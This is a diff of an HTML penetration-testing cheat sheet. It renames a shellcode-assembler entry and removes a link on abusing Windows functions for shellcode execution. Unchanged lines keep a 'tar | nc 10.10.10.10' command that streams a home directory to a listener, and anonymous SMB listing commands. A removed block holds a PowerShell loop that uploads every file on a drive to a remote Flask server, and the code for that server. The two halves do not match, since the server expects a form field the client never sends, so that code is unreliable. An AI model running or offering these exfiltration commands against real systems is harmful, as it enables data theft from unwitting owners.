@@ -131,15 +131,9 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
     </td>
   </tr>
   <tr>
-    <td>Assembler to Write Windows Assembly</td>
+    <td>Defuse Assembler</td>
     <td>
       <p>Tool: <a href="https://defuse.ca/online-x86-assembler.htm">Online tool to convert x86/x64 assembly into raw shellcode bytes.</a></p>
-    </td>
-  </tr>
-  <tr>
-    <td>Windows Functions for Code Execution</td>
-    <td>
-      <a href="http://ropgadget.com/posts/abusing_win_functions.html">Abusing native Windows functions for shellcode execution</a></p>
     </td>
   </tr>
 </table>
@@ -465,30 +459,6 @@ tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
     <td>
       <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
 tar xf share.tar -C share</code></pre>
-    </td>
-  </tr>
-  <tr>
-    <td>Exfil via PowerShell to Flask Upload Server</td>
-    <td>
-      <pre><code>$files = Get-ChildItem -Path "S:\" -Recurse -File
-foreach ($file in $files) {
-    $body = [System.IO.File]::ReadAllBytes($file.FullName)
-    Invoke-WebRequest -Uri "http://10.10.10.10/upload" -Method POST -Body $body -Headers @{"Filename" = $file.Name}
-}</code></pre>
-      <p><i>Linux box run:</i></p>
-      <pre><code>pip3 install flask</code></pre>
-      <pre><code># upload_server.py
-from flask import Flask, request
-app = Flask(__name__)
-
-@app.route('/upload', methods=['POST'])
-def upload():
-    f = request.files['file']
-    f.save(f.filename)
-    return 'File uploaded successfully'
-
-app.run(host='0.0.0.0', port=80)</code></pre>
-      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
     </td>
   </tr>
 </table>
